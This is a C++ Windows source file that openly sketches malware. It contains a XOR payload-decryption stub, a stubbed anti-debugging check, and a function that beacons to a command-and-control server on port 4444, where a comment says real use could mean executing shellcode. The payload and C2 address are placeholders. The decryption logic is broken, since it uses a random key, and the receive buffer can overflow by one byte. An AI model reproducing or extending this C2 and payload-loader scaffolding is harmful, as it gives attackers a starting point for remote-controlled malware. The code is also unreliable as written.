#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdlib>
#include <ctime>
#pragma comment(lib, "Ws2_32.lib")

using namespace std;

// XOR encryption/decryption function
void xorEncryptDecrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key; // XOR encryption/decryption
    }
}

// Simulated payload function (as a byte array)
char payloadData[] = "Malicious payload data here";

// Anti-debugging function
bool antiDebug() {
    //if (IsDebuggerPresent()) {
    //    cout << "Debugger present" << endl;
    //    return true; 
    //}
    return false;
}

// Connect to C2 server function
void connecttoC2() {
    WSADATA wsaData;
    SOCKET connectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
 
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "Startup error" << endl;
        return;
    }

    connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connectSocket == INVALID_SOCKET) {
        cout << "Socket error" << endl;
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444); // Port
    InetPton(AF_INET, TEXT("255.255.255.255"), &serverAddr.sin_addr); // C2 server address

    if (connect(connectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Connection error" << endl;
        closesocket(connectSocket);
        WSACleanup();
        return;
    }

    cout << "Connected to C2" << endl;

    char sendBuffer[] = "Hello from target";
    send(connectSocket, sendBuffer, sizeof(sendBuffer), 0);

    char recvBuffer[512];
    int bytesReceived = recv(connectSocket, recvBuffer, sizeof(recvBuffer), 0);
    if (bytesReceived > 0) {
        recvBuffer[bytesReceived] = '\0'; // Null-terminate received data
        cout << "Received from C2: " << recvBuffer << endl;
    }

    closesocket(connectSocket);
    WSACleanup();
}

// Decryptor function
void decryptorStub() {
    char key = rand() % 256; // Generate a random XOR key
    xorEncryptDecrypt(payloadData, sizeof(payloadData) - 1, key); // Decrypt the payload

    cout << "Decrypted Payload: " << payloadData << endl;
    // Simulate executing the payload (in real scenarios, this could be shellcode execution)
}

int main() {
    srand(time(0)); // Seed the random number generator

    if (antiDebug()) {
        cout << "Exiting due to debugging environment" << endl;
        return 0;
    }

    connecttoC2(); 
    decryptorStub();

    return 0;
}
